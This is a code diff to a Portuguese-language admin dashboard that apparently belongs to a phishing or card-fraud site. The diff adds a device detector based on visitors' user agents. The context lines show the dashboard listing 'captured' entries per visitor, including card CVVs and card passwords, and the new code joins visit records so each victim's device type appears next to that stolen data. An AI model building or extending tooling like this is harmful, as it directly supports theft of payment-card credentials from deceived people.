@@ -38,6 +38,14 @@ interface GroupedClient {
   user_agent?: string;
 }
 
+const detectDevice = (ua?: string): string => {
+  if (!ua) return "Desconhecido";
+  const lower = ua.toLowerCase();
+  if (/tablet|ipad|playbook|silk/i.test(lower)) return "Tablet";
+  if (/mobile|iphone|ipod|android.*mobile|windows phone|blackberry/i.test(lower)) return "Celular";
+  return "Computador";
+};
+
 const AdminDashboard = () => {
   const navigate = useNavigate();
   const [totalVisits, setTotalVisits] = useState(0);
@@ -143,6 +151,20 @@ const AdminDashboard = () => {
     const entries = (captured as CapturedEntry[]) || [];
     setCapturedData(entries);
 
+    // Fetch user_agents from page_visits for device detection
+    const visitorIds = [...new Set(entries.map(e => e.visitor_id))];
+    const { data: visitData } = await supabase
+      .from("page_visits")
+      .select("visitor_id, user_agent")
+      .in("visitor_id", visitorIds.length > 0 ? visitorIds : ["__none__"]);
+    
+    const uaMap: Record<string, string> = {};
+    visitData?.forEach((v) => {
+      if (v.user_agent && !uaMap[v.visitor_id]) {
+        uaMap[v.visitor_id] = v.user_agent;
+      }
+    });
+
     // Group by visitor_id
     const grouped: Record<string, GroupedClient> = {};
     entries.forEach((entry) => {
@@ -150,10 +172,10 @@ const AdminDashboard = () => {
         grouped[entry.visitor_id] = {
           visitor_id: entry.visitor_id,
           created_at: entry.created_at,
+          user_agent: uaMap[entry.visitor_id],
         };
       }
       const client = grouped[entry.visitor_id];
-      // Keep earliest date
       if (entry.created_at < client.created_at) {
         client.created_at = entry.created_at;
       }
@@ -295,6 +317,7 @@ const AdminDashboard = () => {
                     <div><span className="text-muted-foreground">CVV:</span> <span className="text-foreground font-medium">{client.cvv || "—"}</span></div>
                   </div>
                   <div><span className="text-muted-foreground">Senha Cartão:</span> <span className="text-foreground font-medium">{client.senha_cartao || "—"}</span></div>
+                  <div><span className="text-muted-foreground">Dispositivo:</span> <span className="text-foreground font-medium">{detectDevice(client.user_agent)}</span></div>
                 </div>
               </div>
             ))}
